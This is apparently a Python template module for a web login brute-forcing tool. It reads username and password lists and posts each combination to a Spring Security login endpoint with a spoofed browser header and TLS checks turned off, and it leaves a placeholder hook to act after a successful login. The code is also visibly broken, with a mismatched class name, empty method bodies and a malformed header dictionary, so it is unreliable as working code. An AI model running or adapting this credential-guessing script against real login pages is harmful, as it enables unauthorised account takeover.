#! /usr/bin/python
from core.webModule import webModule
from requests import session
import requests
import re
from argparse import ArgumentParser

class ClassName():
    def __init__(self, config, display, lock):
        super(SiteScopeBrute, self).__init__(config, display, lock)
        self.fingerprint="" # What is used to fingerprint this web app?
        self.response="" # What constitutes a valid response?
    def somethingCool(self, config, payload):
        #Do something cool here
    def connectTest(self, config, payload):
        #Create a session and check if account is valid  THIS IS AN EXAMPLE ONLY
        with session() as c:
            resp1 = c.get(config["HOST"] + '/employee/login.jsp', verify=False)
            cookie1 = resp1.cookies['JSESSIONID']
            cookies = dict(JSESSIONID=cookie1)
            c.headers.update({'Host': config["HOST"], 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer:' + config["HOST"] + '/employee/login.jsp', 'Accept-Language': 'en-US,en;q=0.5'})
            c.cookies.clear()
            cpost = c.post(config["HOST"] + '/employee/j_spring_security_check', cookies=cookies, data=payload, allow_redirects=True, verify=False)
            m = re.search('You are unauthorized to access this page.', cpost.text)
            if m:
                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
                if not config["dry_run"]:
                    print("[!] Time to do something cool!")
                    self.somethingCool(config, payload)
            else:
                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
    def scraper(self, config):
        # Scrape page to find which parameters are needed
        with session() as c:
            resp1 = c.get(config["HOST"] + '/login', verify=False)
            print resp1.text
    def payload(self, config):
        # Set payload parameters (i.e. replace j_username and j_password with the correct parameters)
        if config["PASS_FILE"]:
            pass_lines = [pass_line.rstrip('\n') for pass_line in open(config["PASS_FILE"])]
            for pass_line in pass_lines:
                if config["UserFile"]:
                    lines = [line.rstrip('\n') for line in open(config["UserFile"])]
                    for line in lines:
                        config["USERNAME"] = line.strip('\n')
                        config["PASSWORD"] = pass_line.strip('\n')
                        payload = {
                            'j_username': config["USERNAME"],
                            'j_password': config["PASSWORD"]
                            }
                        self.connectTest(config, payload)
                else:
                    config["PASSWORD"] = pass_line.strip('\n')
                    payload = {
                        'j_username': config["USERNAME"],
                        'j_password': config["PASSWORD"]
                        }
                    self.connectTest(config, payload)
        elif config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
            for line in lines:
                config["USERNAME"] = line.strip('\n')
                payload = {
                    'j_username': config["USERNAME"],
                    'j_password': config["PASSWORD"]
                    }
                self.connectTest(config, payload)
        else:
            payload = {
                'j_username': config["USERNAME"],
                'j_password': config["PASSWORD"]
            }
            self.connectTest(config, payload)
